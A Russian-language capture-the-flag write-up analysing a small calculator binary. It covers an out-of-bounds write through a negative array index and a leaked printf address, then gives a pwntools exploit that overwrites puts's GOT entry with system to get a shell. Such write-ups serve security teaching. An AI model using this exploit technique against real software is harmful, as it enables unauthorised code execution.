Исходный код функции main:
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  alarm(0xAu);
  puts("Welcome to simple calculation!!!");
  puts("I can summarize and multiply some values from array!!!\n\n");
  system("date");
  while ( 1 )
  {
    puts("You can:");
    printf("%d) Add value to array\n", 1);
    printf("%d) Summarize value from array\n", 2);
    printf("%d) Multiply value from array\n", 3);
    printf("%d) Get gift\n", 4);
    printf("%d) Greeting\n", 5);
    printf("> ");
    __isoc99_scanf("%d", &choice);
    switch ( choice )
    {
      case 1:
        add_value();
        break;
      case 2:
        summarize();
        break;
      case 3:
        multiply();
        break;
      case 4:
        giiift();
        break;
      case 5:
        greet();
        break;
      default:
        continue;
    }
  }
}
```

Исходный код функции `add_value`:
``` C
int add_value()
{
  int index; // [rsp+4h] [rbp-Ch] BYREF
  __int64 number; // [rsp+8h] [rbp-8h] BYREF

  puts("Ok, new number");
  printf("Index in array: ");
  __isoc99_scanf("%d", &index);
  if ( index > 1000 )
    return puts("Too big value\n\n");
  printf("New number: ");
  __isoc99_scanf("%lld", &number);
  nums[index] = number;
  return puts("\n\n");
}
```
Функция имеет уязвимость. Если указать отрицательный индекс, то программа запишет туда данные. 

В функциях `summarize` и `multiply` нет ничего интересного.

Функция `giiift` даёт адрес `printf` и функции `greet`:
``` C
int giiift()
{
  return printf("It's for your %p %p\n\n\n", &printf, greet);
}
```
(К слову адрес `greet` бесполезный, задача должна была билдиться с PIE).

Функция `greet` просто печатает, что ей даёшь:
``` C
int greet()
{
  char name[128]; // [rsp+0h] [rbp-80h] BYREF

  printf("Send me your name: ");
  __isoc99_scanf("%128s", name);
  printf("Hello ");
  puts(name);
  return puts("\n\n");
}
```

План атаки:
1. Найти в базе `libc` вероятные библиотеки;
2. Вызвать `giiift` и получить адрес `printf`;
3. В найденной `libc` достать `printf_offset` и `system_offset`;
4. Через `add_value` переписать `got_plt` функции `puts` на `system`;
5. Вызвать `greet` и передать туда строку `cat flag`.

Эксплоит:
``` python
nums_addr = 0x404080
got_plt_puts_addr = 0x404000

printf_offset = 0x59900
system_offset = 0x53110

io = start()

# read gift
io.sendlineafter(b'> ', b'4')
io.recvuntil(b'your ')
printf_addr = int(io.recvuntil(b' ')[:-1], 16)

libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset

io.sendlineafter(b'> ', b'1')
index = (got_plt_puts_addr - nums_addr) // 8
io.sendlineafter(b': ', str(index).encode())
io.sendlineafter(b': ', str(system_addr).encode())

io.sendlineafter(b'> ', b'5')
io.sendlineafter(b': ', b'sh')
io.sendlineafter(b' ', b'cat flag')

io.interactive()
```
